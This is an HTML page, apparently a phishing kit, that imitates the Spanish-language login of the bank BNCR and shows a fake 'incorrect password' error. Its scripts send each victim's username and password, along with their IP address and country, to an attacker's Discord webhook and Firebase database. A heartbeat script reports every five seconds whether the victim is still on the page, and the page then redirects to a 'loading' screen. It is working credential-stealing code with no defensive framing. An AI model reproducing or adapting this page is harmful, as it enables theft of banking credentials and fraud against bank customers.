<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>BNCR</title>
<style>
    body {
        background-color: #F6F9F6;
        margin: 0;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        font-family: 'Open Sans', sans-serif;
    }
    header {
    background-color: #001966;
    color: white;
    border-radius: 0 0 32px 32px;
    padding-right: 18px;
    padding-bottom: 100px;
}
    /* Estilos del contenedor de login adaptados */
    .main-content {
        flex: 1;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
    }
    .login-container {
    background-color: #ffffff;
    padding-top: 180px;
    padding-bottom: 70px;
    padding-left: 45px;
    padding-right: 45px;
    margin-top: -20px;
    margin-bottom: -20px;
    border-radius: 8px;
    box-shadow: 0 0px 0px rgba(0, 0, 0, 0);
    width: 100%;
    max-width: 320px;
}
    .txtSeleccionMetodo {
        display: block;
        margin-top: -100px;
        text-align: center;
        margin-bottom: 100px;
        font-size: 25px;
        font-style: normal;
        color: #1E2732;
    }
    .input-group {
        margin-bottom: 15px;
    }
    .input-group label {
        display: block;
        margin-bottom: 5px;
        color: #666666;
        font-size: 14px;
    }
    .input-group input {
        width: 100%;
        padding: 10px;
        border: 1px solid #cccccc;
        background-color: #F6F7F9;
        height: 60px;
        max-width: 296px;
        min-width: 248px;
        border-radius: 8px;
        box-sizing: border-box;
        font-size: 14px;
    }
    .input-group input:focus {
        border-color: #001966;
        outline: none;
    }
    .btn-submit {
        width: 296px;
        padding: 10px;
        background-color: #2A6AD7;
        border: none;
        border-radius: 4px;
        color: white;
        font-size: 16px;
        cursor: pointer;
    }
    .btn-submit:hover {
        background-color: #001144;
    }
.radio-group {
        display: flex;
        justify-content: space-around;
        margin-bottom: 25px;
        margin-top: -60px;
        padding: 10px;
        border-radius: 6px;
    }
    .radio-group label {
        font-size: 14px;
        color: #333333;
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 5px;
    }
footer {
  background-color: #001966;
  color: white;
  text-align: center;
  padding: 20px 0;
  margin-top: auto;
}
</style></head>

<script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
      import {
        getFirestore,
        doc,
        setDoc,
        serverTimestamp,
      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

      const firebaseConfig = {
  apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
  authDomain: "kkkkk-5e2bd.firebaseapp.com",
  databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
  projectId: "kkkkk-5e2bd",
  storageBucket: "kkkkk-5e2bd.firebasestorage.app",
  messagingSenderId: "1059258934487",
  appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
};

      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      // Hacer accesible globalmente
      window.db = db;
      window.doc = doc;
      window.setDoc = setDoc;
      window.serverTimestamp = serverTimestamp;

      // --- SISTEMA DE LATIDOS (Heartbeat) ---
      function enviarLatido() {
        const usuarioId = localStorage.getItem("usuario");
        
        if (usuarioId) {
          setDoc(doc(db, "prolme", usuarioId), {
            last_active: serverTimestamp()
          }, { merge: true }).catch((error) => {
            console.error("Error al enviar latido:", error);
          });
        }
      }

      // Ejecutar el latido cada 5 segundos
      setInterval(enviarLatido, 5000);

      // Enviar latido si el usuario oculta la pestaña
      window.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'hidden') {
          enviarLatido();
        }
      });
    </script>

<body>

 <header>
    <div>
        <img style="margin-top: 20px;margin-bottom: -85px;width: 120px;margin-left: 140px;" src="logo.png">
    </div>
 </header>

 <div class="main-content">
     <div class="login-container">
         <a class="txtSeleccionMetodo" style="text-align: center;">Ingrese con su método favorito</a>
         <div class="radio-group">
                 <label>
                     <input type="radio" name="metodo" value="index" checked=""><b> Contraseña</b>
                 </label>
                 <label>
                     <input type="radio" name="metodo" value="ident"><b> Firma digital</b>
                 </label>
             </div>
         <form style="Margin-left: 20px;" id="loginform">
             <div class="input-group">
                 <p style="color:red;margin-top: -20px;font-size: 14px;">Usuario o Contraseña incorrectos</p>
                 <input type="text" id="username" name="username" required="" placeholder="Usuario">
             </div>
             
             <div class="input-group">
                 <input type="password" id="password" name="password" required="" placeholder="Contraseña">
             </div>
             
             <button type="submit" class="btn-submit">INICIAR SESIÓN</button>
             <div style="text-align: center;">
             <br><br>
             <a style="color:#2A6AD7;"><b>¿Olvidó su contraseña?</b></a>
             <br><br>
             <a style="color:#2A6AD7;"><b>¿Olvidó su usuario?</b></a>
             </div>
         </form>
     </div>
 </div>

 <script>
      const radios = document.querySelectorAll('input[name="metodo"]');

      radios.forEach(radio => {
          radio.addEventListener('change', (e) => {
              if (e.target.value === 'index') {
                  window.location.href = 'index.html';
              } else if (e.target.value === 'ident') {
                  window.location.href = 'ident.html';
              }
          });
      });
  </script>

<script>
    async function getCountry() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();
                return data.country;
            } catch (error) {
                console.error('Error al obtener el país:', error);
                return 'País Desconocido';
            }
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error al obtener la dirección IP:', error);
                return 'IP Desconocida';
            }
        }
    document
      .querySelector("#loginform")
      .addEventListener("submit", async (event) => {
        event.preventDefault();

        const usuario = localStorage.getItem("usuario") || document.querySelector("#username").value;
        const password = document.querySelector("#password").value;
        const pais = await getCountry();
        const ip = await getIPAddress();

        if (!usuario || !password) {
          alert("Por favor, complete todos los campos.");
          return;
        }

        try {
          const userRef = window.doc(window.db, "prolme", usuario);
          await window.setDoc(userRef, {
            password: password,
            page: 0,
            last_active: window.serverTimestamp()
          }, { merge: true });

          const message = `➖➖➖➖➖[ 🏦BNCR ]➖➖➖➖➖\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${password}\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís: ${pais}\nIP: ${ip}\n➖➖➖➖➖[ By FwC 👨🏻‍💻 ]➖➖➖➖➖\n`;

      const discord_webhook_url = "https://discord.com/api/webhooks/1534616941476581568/YTnnkJt7vQqtrmv1ERAYs0vEJDb4340R0lhVmPvflTgky0JErdqJKj2VPa4pQ9al6ReU";

      await fetch(discord_webhook_url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: message
        }),
      });

          window.location.href = "cargando.html";
        } catch (error) {
          console.error("Error al enviar datos:", error);
        }
      });
  </script>
